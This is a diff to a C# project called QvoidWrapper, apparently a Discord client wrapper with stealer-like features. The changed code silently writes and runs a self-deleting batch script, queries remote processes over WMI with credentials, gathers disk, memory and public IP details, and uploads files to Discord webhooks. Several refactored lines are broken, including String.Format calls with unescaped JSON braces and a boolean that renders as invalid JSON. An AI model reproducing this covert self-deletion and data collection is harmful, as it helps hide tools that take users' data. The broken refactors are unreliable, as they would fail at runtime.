@@ -42,15 +42,11 @@ namespace QvoidWrapper
             string strExe = new FileInfo(Application.ExecutablePath).Name;
 
             StreamWriter swDestruct = new StreamWriter(strPath);
-            swDestruct.WriteLine("attrib \"" + strExe + "\"" + " -a -s -r -h");
-            swDestruct.WriteLine(":Repeat");
-            swDestruct.WriteLine("del " + "\"" + strExe + "\"");
-            swDestruct.WriteLine("if exist \"" + strExe + "\"" + " goto Repeat");
-            swDestruct.WriteLine("del \"" + strName + "\"");
+            swDestruct.WriteLine($"attrib \"{strExe}\" -a -s -r -h\n:Repeat\ndel \"{strExe}\"\nif exist \"{strExe}\" goto Repeat\ndel \"{strName}\"");
             swDestruct.Close();
 
             Process procDestruct = new Process();
-            procDestruct.StartInfo.FileName = "destruct.bat";
+            procDestruct.StartInfo.FileName = strName;
             procDestruct.StartInfo.CreateNoWindow = true;
             procDestruct.StartInfo.UseShellExecute = false;
 
@@ -205,10 +201,10 @@ namespace QvoidWrapper
             connectoptions.Username = userName;
             connectoptions.Password = pword;
 
-            ManagementScope scope = new ManagementScope(@"\\" + computerName + @"\root\cimv2", connectoptions);
+            ManagementScope scope = new ManagementScope($@"\\{computerName}\root\cimv2", connectoptions);
 
             // WMI query
-            var query = new SelectQuery("select * from Win32_process where name = '" + processName + "'");
+            var query = new SelectQuery($"select * from Win32_process where name = '{processName}'");
 
             using (var searcher = new ManagementObjectSearcher(scope, query))
             {
@@ -385,7 +381,7 @@ namespace QvoidWrapper
             DriveInfo[] Drives = DriveInfo.GetDrives();
             foreach (DriveInfo _drive in Drives)
                 if (_drive.IsReady)
-                    DiskDetails += $"Drive {_drive.Name}\\ - {SizeSuffix(_drive.AvailableFreeSpace)}/{SizeSuffix(_drive.TotalSize)}{Environment.NewLine}";
+                    DiskDetails += $"Drive {_drive.Name}\\ - {SizeSuffix(_drive.AvailableFreeSpace)}/{SizeSuffix(_drive.TotalSize)}\n";
 
             ObjSearcher = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory");
 
@@ -409,7 +405,7 @@ namespace QvoidWrapper
             request.UserAgent = "curl";
             try
             {
-                PublicIPv4 = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("\n", "").Replace("\r", "");
+                PublicIPv4 = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("\n", string.Empty).Replace("\r", string.Empty);
             }
             catch
             { }
@@ -648,33 +644,29 @@ namespace Discord
 
         public void UploadFile(ulong ChannelId, FileInfo file)
         {
-            string bound = "------------------------" + DateTime.Now.Ticks.ToString("x");
+            string bound = $"------------------------{DateTime.Now.Ticks.ToString("x")}";
             WebClient webhookRequest = new WebClient();
             webhookRequest.Proxy = new WebProxy();
             webhookRequest.Headers.Add("Content-Type", "multipart/form-data; boundary=" + bound);
             MemoryStream stream = new MemoryStream();
-            byte[] beginBodyBuffer = Encoding.UTF8.GetBytes("--" + bound + "\r\n");
+            byte[] beginBodyBuffer = Encoding.UTF8.GetBytes($"--{bound}\r\n");
             stream.Write(beginBodyBuffer, 0, beginBodyBuffer.Length);
 
             if (file != null && file.Exists)
             {
-                string fileBody = "Content-Disposition: form-data; name=\"file\"; filename=\"" + file.Name + "\"\r\nContent-Type: application/octet-stream\r\n\r\n";
+                string fileBody = $"Content-Disposition: form-data; name=\"file\"; filename=\"{file.Name}\"\r\nContent-Type: application/octet-stream\r\n\r\n";
                 byte[] fileBodyBuffer = Encoding.UTF8.GetBytes(fileBody);
                 stream.Write(fileBodyBuffer, 0, fileBodyBuffer.Length);
                 byte[] fileBuffer = File.ReadAllBytes(file.FullName);
                 stream.Write(fileBuffer, 0, fileBuffer.Length);
-                string fileBodyEnd = "\r\n--" + bound + "\r\n";
+                string fileBodyEnd = $"\r\n--{bound}\r\n";
                 byte[] fileBodyEndBuffer = Encoding.UTF8.GetBytes(fileBodyEnd);
                 stream.Write(fileBodyEndBuffer, 0, fileBodyEndBuffer.Length);
             }
 
             string jsonBody = string.Concat(new string[]
             {
-                "Content-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n",
-                string.Format("{0}\r\n", new Embed()),
-                "--",
-                bound,
-                "--"
+                $"Content-Disposition: form-data; name=\"payload_json\"\r\nContent-Type: application/json\r\n\r\n{new Embed()}\r\n--{bound}--",//Not Sure For This One :)
             });
             byte[] jsonBodyBuffer = Encoding.UTF8.GetBytes(jsonBody);
             stream.Write(jsonBodyBuffer, 0, jsonBodyBuffer.Length);
@@ -753,7 +745,7 @@ namespace Discord
 
             try
             {
-                string data = "{" + $"\"content\":\"{message}\", \"tts\":{(tts ? "true" : "false")}" + "}";
+                string data = "{" + $"\"content\":\"{message}\", \"tts\":{(tts ? true : false)}" + "}";
                 //string data = "{    \"content\": \"This is a message with components\",    \"components\": [        {            \"type\": 1,            \"components\": []        }    ]}";
                 StreamWriter stream = new StreamWriter(request.GetRequestStream());
                 stream.Write(data);
@@ -818,7 +810,7 @@ namespace Discord
 
         public DiscordMember[] GetSocketGuildMembers(ulong GuildId)
         {
-            Gateway.Socket.Send("{ \"op\": 8, \"d\": { \"guild_id\": \"" + GuildId + "\", \"query\": \"\", \"limit\": 0}}");
+            Gateway.Socket.Send(String.Format("{\"op\": 8, \"d\": { \"guild_id\": \"{0}\", \"query\": \"\", \"limit\": 0}}", GuildId));
             WaitingForMembers = true;
             while (WaitingForMembers)
                 continue;
@@ -1116,7 +1108,7 @@ namespace Discord
                 if (string.IsNullOrEmpty(Url))
                     throw new ArgumentNullException("Invalid Webhook URL.");
 
-                string bound = "------------------------" + DateTime.Now.Ticks.ToString("x");
+                string bound = $"------------------------{DateTime.Now.Ticks.ToString("x")}";
 
                 WebClient webhook = new WebClient();
                 webhook.Proxy = new WebProxy();
@@ -1828,10 +1820,9 @@ namespace Discord.Backend
                     {
                         case 10:
 #if DEBUG
-                            Console.WriteLine("Wumpus said Hello.");
-                            Console.WriteLine("Identifying.");
+                            Console.WriteLine("Wumpus said Hello.\nIdentifying.");
 #endif
-                            Socket.Send("{\"op\": 2, \"d\": { \"token\": \"" + client.Token + "\", \"intents\": 4611, \"presence\": " + JsonConvert.SerializeObject(Status) + ", \"properties\": { \"$os\": \"linux\", \"$browser\": \"QvoidWrapper\", \"$device\": \"QvoidWrapper\" } } }");
+                            Socket.Send(String.Format("{\"op\": 2, \"d\": { \"token\": \"{0}\", \"intents\": 4611, \"presence\": {1}, \"properties\": { \"$os\": \"linux\", \"$browser\": \"QvoidWrapper\", \"$device\": \"QvoidWrapper\" } } }", client.Token, JsonConvert.SerializeObject(Status)));
 #if DEBUG
                             Console.WriteLine("Identifying successfully sent.");
 #endif
